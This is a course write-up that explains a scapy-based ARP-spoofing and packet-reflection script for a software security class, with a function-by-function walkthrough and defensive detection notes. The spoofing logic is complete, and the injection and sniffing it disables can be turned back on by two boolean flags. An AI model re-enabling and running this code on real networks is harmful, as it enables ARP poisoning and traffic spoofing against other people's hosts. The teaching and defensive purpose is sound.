# CSE545 Software Security - Reflector Project

## Deweaponized Reflector Demo (Educational)

```{important}
This page documents an educational packet-reflecting demo created for a software security course.

**Key functionality has been intentionally obscured/disabled for safety:**
- **Live sniffing** is disabled by default.
- **Packet injection** (`sendp`) is replaced by a safe logger that does not transmit frames.

This preserves learning value (protocol layers, field meanings, control flow) while preventing use as a live network spoofing/reflector tool.
````

---

## Threat-model framing (defensive lens)

```{admonition} Why this matters in security engineering
:class: tip

This demo illustrates *why* certain network assumptions fail:

- **ARP has no built-in authentication** (common in LAN environments).
- Stateless protocols (e.g., **UDP/ICMP**) are easier to spoof/reflect than **TCP** (which is stateful).
- Forged packets must account for **checksums**, **headers**, and **identity mismatches** (L2 vs L3).
```

```{warning}
Do not run “live-capture + live-injection” traffic-manipulation tooling on networks you do not explicitly own and control.
Even in a lab, keep experiments isolated (e.g., host-only / private virtual networks).
This publication keeps the code *non-operational* by design.
```

---

## What this code demonstrates (and what it does not)

```{note}
**Demonstrates (safe):**
- Layer identification (`Ether/IP/ARP/ICMP/TCP/UDP`)
- Packet-field extraction (src/dst MACs, src/dst IPs, L4 fields)
- “Would-have-built” forged packet objects *without sending*

**Does not demonstrate:**
- How to deploy or run a real spoofing/reflector tool
- How to optimize or “make it work” on a real network
```

---

## Walkthrough: protocol anatomy

### Layer 2: Ethernet (L2)

```{dropdown} Ethernet header fields used by the demo
:open: false

Every on-LAN frame begins with an Ethernet header:

- `Ether.src` — source MAC address
- `Ether.dst` — destination MAC address
- `Ether.type` — payload type (e.g., IPv4, ARP)

In this demo:
- received packets use `packet[Ether].src` / `.dst` to identify who sent the frame.
- forged packets (educational-only) are constructed with a fixed source MAC (`reflector_ethernet`)
  and a destination MAC equal to the observed sender’s MAC.
```

### Layer 3: IP (L3)

```{dropdown} IP header fields used by the demo
:open: false

For IP packets:

- `IP.src` — source IP address
- `IP.dst` — destination IP address
- `IP.proto` — transport protocol (ICMP/TCP/UDP)

The key educational point is the distinction between:
- **L2 identity** (MAC addresses on the local segment)
- **L3 identity** (IP addresses, which can be spoofed in crafted packets)

A mismatch (e.g., one MAC sending traffic claiming many unrelated IPs) is often a detection signal in defensive monitoring.
```

### ARP

```{dropdown} ARP request vs reply (what 'op' means)
:open: false

ARP resolves IP → MAC on a LAN.

* 'ARP.op = 1' means *request*: “Who has IP X? Tell Y.”
* 'ARP.op = 2' means *reply*: “IP X is at MAC Z.”

In a poisoning scenario, forged replies attempt to convince a host to cache an incorrect mapping.
In this published code, the packet is constructed only for demonstration and not transmitted.
```

### ICMP

```{dropdown} ICMP echo semantics (type/code/id/seq)
:open: false

ICMP is used by tools like `ping`.

- Echo request: typically `type=8`
- Echo reply: `type=0`

Fields such as:
- `id` (identifier)
- `seq` (sequence number)

exist to match replies with requests. The demo shows how those fields can be copied into a constructed reply *in theory*.
```

### UDP vs TCP

```{dropdown} Why UDP/ICMP are “easy” and TCP is “hard”
:open: false

UDP and ICMP are comparatively stateless: crafting “a response-shaped packet” is straightforward.

TCP is stateful:
- sequence numbers and acknowledgements must be consistent across a session
- flags coordinate connection establishment and teardown (SYN/ACK/FIN, etc.)
- options (timestamps, window scaling) influence peer expectations

This demo intentionally stays at the “packet anatomy and construction” level and does not implement a TCP state machine.
```

---

## Deweaponized code listing

```{admonition} Publication safety changes
:class: important

The code below is deliberately **non-operational** as a live tool:

- `scapy.sendp(...)` is replaced by `safe_sendp(...)` which **never transmits**.
- Live sniffing is disabled unless processing an **offline PCAP** via `--pcap`.
```

````{dropdown} Click to view the deweaponized Python script
:open: false
```python
#!/usr/bin/env python3
"""
DEWEAPONIZED EDUCATIONAL VERSION (SAFE TO PUBLISH)

Key functionality has been intentionally obscured/disabled for safety:
- Live packet capture is disabled by default.
- Packet injection (sendp) is replaced with a no-op logger.

This preserves the learning value (protocol parsing, field extraction, control flow),
but prevents use as a live spoofing/traffic reflection tool.
"""

import argparse
import ipaddress
import re
import sys
import random

import scapy.all as scapy

# -------------------------------------------------------------------------------------------------
# Safety switches (publish-safe defaults)
# -------------------------------------------------------------------------------------------------
DISABLE_LIVE_SNIFFING = True          # prevents scapy.sniff from running on an interface
DISABLE_PACKET_INJECTION = True       # prevents forged frames from being transmitted


def safe_sendp(frame, iface=None, verbose=False):
    """
    SAFE SUBSTITUTE for scapy.sendp().

    This intentionally does NOT transmit anything.
    It only prints a short summary that a send would have occurred.
    """
    try:
        print("[SAFE MODE] Blocked packet injection. Would have sent:", frame.summary())
    except Exception:
        print("[SAFE MODE] Blocked packet injection. (Could not summarize frame.)")


descStr = """This program is an educational demonstration of protocol parsing and reflection logic.

IMPORTANT:
This published version has key functionality intentionally obscured/disabled for safety:
- No live sniffing by default.
- No packet injection (sendp is stubbed).
"""

parser = argparse.ArgumentParser(description=descStr)

parser.add_argument('--interface', dest='interface', type=str, required=True,
                    help='Interface name (used for labeling / validation; live sniffing disabled)')
parser.add_argument('--victim-ip', dest='victim_ip', type=str, required=True,
                    help='Victim IP address (educational identity)')
parser.add_argument('--victim-ethernet', dest='victim_ethernet', type=str, required=True,
                    help='Victim MAC address (educational identity)')
parser.add_argument('--reflector-ip', dest='reflector_ip', type=str, required=True,
                    help='Reflector IP address (educational identity)')
parser.add_argument('--reflector-ethernet', dest='reflector_ethernet', type=str, required=True,
                    help='Reflector MAC address (educational identity)')

# Optional: allow offline demonstration using a pcap file (safe)
parser.add_argument('--pcap', dest='pcap', type=str, required=False,
                    help='Optional PCAP file to process offline (safe).')

args = parser.parse_args()

# -------------------------------------------------------------------------------------------------
# Validation
# -------------------------------------------------------------------------------------------------
try:
    ipaddress.ip_address(args.victim_ip)
except ValueError:
    print("Invalid IP address for Victim")
    sys.exit(1)

try:
    ipaddress.ip_address(args.reflector_ip)
except ValueError:
    print("Invalid IP address for Reflector")
    sys.exit(1)

mac_re = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
if not re.match(mac_re, args.victim_ethernet):
    print("Invalid MAC for Victim Ethernet address")
    sys.exit(1)

if not re.match(mac_re, args.reflector_ethernet):
    print("Invalid MAC for Reflector Ethernet address")
    sys.exit(1)

# Interface validation (basic)
try:
    import netifaces
    if args.interface not in netifaces.interfaces():
        print("Invalid interface")
        sys.exit(1)
except Exception:
    print("[NOTE] netifaces not available; skipping interface existence validation.")

interface = args.interface
victim_ip = args.victim_ip
victim_ethernet = args.victim_ethernet
reflector_ip = args.reflector_ip
reflector_ethernet = args.reflector_ethernet

print("Interface =", interface)
print("Victim IP =", victim_ip)
print("Victim Ethernet =", victim_ethernet)
print("Reflector IP =", reflector_ip)
print("Reflector Ethernet =", reflector_ethernet)

print("\n[SAFETY NOTICE] Key functionality is intentionally obscured/disabled for publication:")
print(" - Live sniffing disabled =", DISABLE_LIVE_SNIFFING)
print(" - Packet injection disabled =", DISABLE_PACKET_INJECTION)
print(" - Use --pcap to run an OFFLINE demonstration (safe)\n")


def spoof_ARP_from_Reflector_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Parses ARP requests and demonstrates how a forged reply would be constructed.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if scapy.ARP not in packet:
            return
        if packet[scapy.ARP].op != 1:  # request
            return

        pdst = packet[scapy.ARP].pdst
        hwsrc = packet[scapy.ARP].hwsrc
        psrc = packet[scapy.ARP].psrc

        if pdst == victim_ip:
            spoofed_ip = victim_ip
            print(f"[ARP] Sender {psrc} requested MAC for victim {victim_ip}")
        elif pdst == reflector_ip:
            spoofed_ip = reflector_ip
            print(f"[ARP] Sender {psrc} requested MAC for reflector {reflector_ip}")
        else:
            return

        arp_reply = scapy.ARP(
            op=2,
            psrc=spoofed_ip,
            hwsrc=reflector_ethernet,
            pdst=psrc,
            hwdst=hwsrc
        )
        ether = scapy.Ether(src=reflector_ethernet, dst=hwsrc) / arp_reply

        print("[ARP] Constructed (non-sent) forged ARP reply:", ether.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(ether, iface=interface, verbose=False)
        else:
            safe_sendp(ether, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ARP packet:", e)


def send_ICMP_packet_from_Reflector_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates how an ICMP packet could be reflected with a spoofed source IP.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.ICMP in packet and scapy.Ether in packet):
            return

        icmp_pkt = packet.getlayer(scapy.ICMP)

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=reflector_ip, dst=packet[scapy.IP].src) /
            scapy.ICMP(type=icmp_pkt.type, code=icmp_pkt.code, id=icmp_pkt.id, seq=icmp_pkt.seq) /
            icmp_pkt.payload
        )

        print("[ICMP] Constructed (non-sent) reflected ICMP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ICMP packet:", e)


def send_ICMP_packet_from_Victim_to_Attacker(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates an ICMP echo reply that would appear to come from victim_ip.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.ICMP in packet and scapy.Ether in packet):
            return

        icmp_pkt = packet.getlayer(scapy.ICMP)

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=victim_ip, dst=packet[scapy.IP].src) /
            scapy.ICMP(type=0, code=0, id=icmp_pkt.id, seq=icmp_pkt.seq) /
            icmp_pkt.payload
        )

        print("[ICMP] Constructed (non-sent) victim-spoofed echo reply:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing ICMP packet:", e)


def send_UDP_packet(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates UDP reflection packet construction.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.UDP in packet and scapy.Ether in packet):
            return

        dst_ip = packet[scapy.IP].dst
        if dst_ip == victim_ip:
            source_ip = reflector_ip
        elif dst_ip == reflector_ip:
            source_ip = victim_ip
        else:
            return

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=source_ip, dst=packet[scapy.IP].src) /
            scapy.UDP(sport=packet[scapy.UDP].sport, dport=packet[scapy.UDP].dport)
        )
        if scapy.Raw in packet:
            reflected /= packet[scapy.Raw]

        print("[UDP] Constructed (non-sent) reflected UDP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing UDP packet:", e)


def send_TCP_packet(packet):
    """
    EDUCATIONAL ONLY (DEWEAPONIZED):
    Demonstrates TCP reflection packet construction.
    Actual transmission is blocked in SAFE MODE.
    """
    try:
        if not (scapy.IP in packet and scapy.TCP in packet and scapy.Ether in packet):
            return

        dst_ip = packet[scapy.IP].dst
        if dst_ip == victim_ip:
            source_ip = reflector_ip
        elif dst_ip == reflector_ip:
            source_ip = victim_ip
        else:
            return

        reflected = (
            scapy.Ether(src=reflector_ethernet, dst=packet[scapy.Ether].src) /
            scapy.IP(src=source_ip, dst=packet[scapy.IP].src) /
            scapy.TCP(
                sport=packet[scapy.TCP].sport,
                dport=packet[scapy.TCP].dport,
                seq=packet[scapy.TCP].seq,
                ack=packet[scapy.TCP].ack,
                flags=packet[scapy.TCP].flags,
                options=packet[scapy.TCP].options
            )
        )
        if scapy.Raw in packet:
            reflected /= packet[scapy.Raw]

        try:
            del reflected[scapy.TCP].chksum
            del reflected[scapy.IP].chksum
        except Exception:
            pass

        print("[TCP] Constructed (non-sent) reflected TCP packet:", reflected.summary())

        if not DISABLE_PACKET_INJECTION:
            scapy.sendp(reflected, iface=interface, verbose=False)
        else:
            safe_sendp(reflected, iface=interface, verbose=False)

    except Exception as e:
        print("Error processing TCP packet:", e)


def handle_packet(packet):
    try:
        if packet.haslayer(scapy.ARP):
            spoof_ARP_from_Reflector_to_Attacker(packet)
            return

        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst

            if packet.haslayer(scapy.ICMP):
                if dst_ip == victim_ip:
                    print(f"[DISPATCH] ICMP to victim: {src_ip} -> {dst_ip}")
                    send_ICMP_packet_from_Reflector_to_Attacker(packet)
                elif dst_ip == reflector_ip:
                    print(f"[DISPATCH] ICMP to reflector: {src_ip} -> {dst_ip}")
                    send_ICMP_packet_from_Victim_to_Attacker(packet)

            elif packet.haslayer(scapy.TCP):
                if dst_ip in (victim_ip, reflector_ip):
                    print(f"[DISPATCH] TCP: {src_ip} -> {dst_ip}")
                    send_TCP_packet(packet)

            elif packet.haslayer(scapy.UDP):
                if dst_ip in (victim_ip, reflector_ip):
                    print(f"[DISPATCH] UDP: {src_ip} -> {dst_ip}")
                    send_UDP_packet(packet)

    except Exception as e:
        print("Error handling packet:", e)


if __name__ == "__main__":
    if args.pcap:
        print(f"[*] Offline processing PCAP (safe): {args.pcap}")
        try:
            pkts = scapy.rdpcap(args.pcap)
            for p in pkts:
                handle_packet(p)
        except Exception as e:
            print("Failed to read/process PCAP:", e)
            sys.exit(1)
    else:
        if DISABLE_LIVE_SNIFFING:
            print("[SAFE MODE] Live sniffing is disabled in this published version.")
            print("          Provide --pcap <file.pcap> to demonstrate offline parsing safely.")
            sys.exit(0)
        else:
            scapy.sniff(iface=interface, prn=handle_packet)

````

---

## Detailed explanation of the deweaponized script

```{important}
This explanation describes the **published, deweaponized** version.

Two capabilities that make traffic-manipulation tools dangerous are **intentionally disabled**:

1. **Live packet capture** (disabled unless offline `--pcap` is provided)
2. **Packet injection** (all sends are routed through `safe_sendp()` which does not transmit)

The remaining logic is preserved to teach:
- protocol layering (Ether/IP/ARP/ICMP/TCP/UDP),
- field extraction,
- and *how a forged packet would be constructed in theory*.
````

---

### 1) “Safety switches”: making the script non-operational on a real network

The script introduces two global flags:

```python
DISABLE_LIVE_SNIFFING = True
DISABLE_PACKET_INJECTION = True
```

These are the most important lines in the publication-safe version.

* **`DISABLE_LIVE_SNIFFING`**

  * When `True`, the script will **not** call `scapy.sniff(...)`.
  * Instead, it prints a message and exits unless you provide `--pcap`.

* **`DISABLE_PACKET_INJECTION`**

  * When `True`, the script will **not** call `scapy.sendp(...)` even if a packet is “constructed”.
  * Instead, all “send” actions are routed to `safe_sendp(...)`, which **only logs** a summary.

This means the code can be studied and executed for learning, but it does **not** function as a live network manipulator.

```{admonition} Why disabling both capture and injection matters
:class: tip

A live traffic tool needs **both** of the following to have real-world impact:

- a way to **observe** traffic (capture),
- a way to **affect** traffic (injection).

Disabling injection alone prevents harm, but disabling capture as well further reduces the chance that the code can be repurposed by copy/paste.
```

---

### 2) `safe_sendp(...)`: a safe stand-in for Scapy injection

In Scapy:

* `send()` transmits at L3 (IP)
* `sendp()` transmits at L2 (Ethernet frames)

The original script used **`sendp()`** because it wanted to control Ethernet headers directly.

The deweaponized script replaces this with:

```python
def safe_sendp(frame, iface=None, verbose=False):
    print("[SAFE MODE] Blocked packet injection. Would have sent:", frame.summary())
```

Key points:

* It **never transmits** a frame.
* It avoids dumping raw bytes.
* It uses `frame.summary()` which produces a compact “layer chain” string like:

  * `Ether / IP / ICMP 192.168... > 192.168...`
  * `Ether / ARP is-at ...`

This preserves the learning value (“what would have been sent?”) without creating real network effects.

---

### 3) Command-line arguments: controlling identities for an educational model

The script defines five core parameters:

* `--interface`
* `--victim-ip`, `--victim-ethernet`
* `--reflector-ip`, `--reflector-ethernet`

These represent *identities* the script uses to explain packet construction.

```{note}
Even though the script accepts `--interface`, the published version does not perform live sniffing by default.
The interface is used for validation and for labeling/logging.
```

It also adds a **safe** option:

* `--pcap <file.pcap>`

This enables **offline packet processing**:

* No network capture
* No injection
* Just parsing and demonstrating the control flow

---

### 4) Input validation: why it exists and what it prevents

The script validates IPs and MACs before proceeding.

#### IP validation (`ipaddress.ip_address`)

```python
ipaddress.ip_address(args.victim_ip)
ipaddress.ip_address(args.reflector_ip)
```

* Ensures `victim_ip` and `reflector_ip` are syntactically valid IP literals.
* Prevents confusing runtime errors later during packet building.

#### MAC validation (regex)

```python
'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
```

* Enforces 6 octets in hex format (e.g., `08:00:27:aa:bb:cc`).
* Rejects malformed strings early.

#### Interface validation (`netifaces`)

```python
if args.interface not in netifaces.interfaces(): ...
```

* A basic sanity check.
* In the published version it’s wrapped in a try/except, so readers without `netifaces` can still run offline PCAP demonstrations.

```{admonition} Defensive engineering point
:class: tip

Even “educational” tools benefit from strict input validation:
- fewer ambiguous errors,
- safer defaults,
- clearer demonstration of expected formats.
```

---

### 5) Core Scapy concepts used in the script

The code repeatedly uses three Scapy patterns:

#### (A) Layer presence tests

Examples:

* `scapy.ARP in packet`
* `packet.haslayer(scapy.IP)`
* `packet.haslayer(scapy.TCP)`

These determine what protocol is present.

#### (B) Field extraction by layer indexing

Examples:

* `packet[scapy.Ether].src` and `.dst`
* `packet[scapy.IP].src` and `.dst`
* `packet[scapy.UDP].sport` and `.dport`

This is Scapy’s “decode and index” interface.

#### (C) Packet construction by layering with `/`

Example:

```python
scapy.Ether(...) / scapy.IP(...) / scapy.UDP(...) / payload
```

The `/` operator stacks layers from L2 → L3 → L4 → payload.

---

### 6) ARP section: demonstrate how a forged reply is structured (without sending)

Function:

```python
def spoof_ARP_from_Reflector_to_Attacker(packet):
    ...
```

#### Step-by-step behavior

1. Confirm the packet contains ARP:

   ```python
   if scapy.ARP not in packet: return
   ```

2. Only act on ARP **requests** (`op == 1`):

   ```python
   if packet[scapy.ARP].op != 1: return
   ```

3. Extract key ARP fields:

   * `pdst`: “Which IP is being asked about?”
   * `psrc`: “Who is asking?” (requester IP)
   * `hwsrc`: requester MAC

4. Decide whether the request is “interesting”:

   * if `pdst` matches `victim_ip` or `reflector_ip`

5. Construct an ARP **reply** packet object (for demonstration only):

   * `op=2` (reply)
   * `psrc=<spoofed_ip>` (the IP we claim to own)
   * `hwsrc=reflector_ethernet` (the MAC we claim is associated)
   * `pdst=<requester_ip>`, `hwdst=<requester_mac>`

6. Wrap it in an Ethernet frame:

   * `Ether.src = reflector_ethernet`
   * `Ether.dst = requester MAC`

7. Log the summary and block transmission via `safe_sendp`.

```{admonition} Educational takeaway
:class: tip

ARP is fundamentally a **cache-priming protocol** on many LANs.
This demo shows the *shape* of a reply, and why defenders watch for unusual IP→MAC claims.
```

---

### 7) ICMP section: demonstrate a “reflected” packet shape

There are two ICMP functions:

#### (A) “Reflector identity” ICMP

```python
send_ICMP_packet_from_Reflector_to_Attacker(packet)
```

* Requires Ether + IP + ICMP.
* Builds a new packet addressed back to the sender:

  * `Ether.dst` becomes original sender MAC
  * `IP.dst` becomes original sender IP
* Spoofs the *source IP* as `reflector_ip`.

It copies:

* `type`, `code`, `id`, `seq`,
* and the payload.

#### (B) “Victim identity” echo reply

```python
send_ICMP_packet_from_Victim_to_Attacker(packet)
```

* Constructs an ICMP **echo reply** (`type=0`),
* but sets `IP.src = victim_ip` to demonstrate how “identity spoofing” can look at L3.

In both cases:

* The packet object is constructed,
* The script logs `summary()`,
* Transmission is blocked.

---

### 8) UDP section: demonstrate stateless reflection

Function:

```python
send_UDP_packet(packet)
```

It:

1. Verifies Ether + IP + UDP exist.
2. Chooses a spoofed `source_ip` based on `dst_ip`:

   * This is a didactic “swap identity” rule.
3. Constructs:

   * Ether(src=reflector MAC, dst=sender MAC)
   * IP(src=spoofed, dst=sender IP)
   * UDP(sport=original sport, dport=original dport)
4. Copies Raw payload if present.
5. Logs summary; does not send.

```{note}
UDP is used here because it is easy to illustrate:
it does not require maintaining per-connection state the way TCP does.
```

---

### 9) TCP section: demonstrate field copying and checksum logic (without being a TCP engine)

Function:

```python
send_TCP_packet(packet)
```

This is intentionally a **packet anatomy demo**, not a full TCP endpoint.

It copies:

* `sport`, `dport`,
* `seq`, `ack`,
* `flags`,
* `options`,
* payload if present.

Then it deletes checksums:

```python
del reflected[TCP].chksum
del reflected[IP].chksum
```

Why show this?

* Because checksums depend on header values.
* If you change IP source/destination or TCP fields, the checksum must match.
* Scapy recomputes checksums when sending—here we show the idiom as part of protocol correctness, even though the packet is never transmitted.

```{admonition} Educational takeaway (TCP)
:class: tip

TCP is **stateful**. A real TCP-speaking endpoint must maintain session state,
sequence number expectations, retransmission logic, etc.

This demo shows:
- where those fields live,
- how they can be read/copied,
- and why checksums matter,

without implementing an actual TCP state machine.
```

---

### 10) The dispatcher: mapping “what you saw” to “what you would build”

Function:

```python
def handle_packet(packet):
```

This function is the “traffic classifier”.

* If it sees ARP → call the ARP handler.
* Else if it sees IP:

  * ICMP → call ICMP constructor based on destination
  * TCP → call TCP constructor for victim/reflector destinations
  * UDP → call UDP constructor for victim/reflector destinations

This preserves the original program’s pedagogical structure:

* “Detect protocol”
* “Extract fields”
* “Construct a response-shaped packet object”

---

### 11) Main: offline PCAP parsing instead of live sniffing

At the bottom:

* If `--pcap` is provided:

  ```python
  pkts = scapy.rdpcap(args.pcap)
  for p in pkts:
      handle_packet(p)
  ```

This is the safest way to demonstrate the logic: it processes an existing capture file.

* If `--pcap` is not provided:

  * the script exits with a safety message because `DISABLE_LIVE_SNIFFING=True`.

```{important}
This design ensures your published code does not become a “turnkey live tool”.
It remains an offline educational parser and packet-constructor demonstrator.
```

---

## Practical notes for readers (safe)

```{admonition} How to use this safely (offline)
:class: tip

- Use a PCAP from a controlled lab environment (or a benign sample capture).
- Run the script with `--pcap` to observe:
  - protocol classification,
  - extracted fields,
  - constructed packet summaries.

No traffic is transmitted; the output is purely explanatory.
```

---

## Summary

```{admonition} Summary
:class: note

This publication-safe script preserves the **structure** of the original coursework artifact:

- argument parsing + validation,
- protocol identification,
- header-field extraction,
- packet-layer construction,
- checksum correctness idioms,

while intentionally obscuring the two critical operational capabilities:

- **live sniffing** (disabled),
- **packet injection** (blocked).
```

---

## Suggested exercises (safe)

```{admonition} Safe lab exercises
:class: tip

1. Capture a small PCAP from a controlled environment (or use a benign sample PCAP).
2. Run the script with `--pcap` and observe:
   - protocol dispatch decisions (ARP vs ICMP vs TCP vs UDP)
   - which header fields are extracted
   - summaries of the “constructed (non-sent)” packets
3. In Wireshark, compare:
   - the original packet headers
   - the demo’s printed “constructed packet” summary
```

---

## Defensive detection notes

```{dropdown} What defenders look for (high-level)
:open: false

Common indicators for spoofing / poisoning attempts include:

- Unusual ARP reply patterns (e.g., one MAC claiming multiple IPs)
- Sudden changes in IP→MAC mappings
- L2/L3 inconsistencies (MAC identity doesn’t match expected host/IP)
- Elevated rates of ICMP/UDP replies that are inconsistent with expected service behavior

Mitigations in enterprise networks often include:
- DHCP snooping + Dynamic ARP Inspection
- Switch port security / static bindings (where practical)
- IDS/IPS signatures for anomalous ARP activity
```



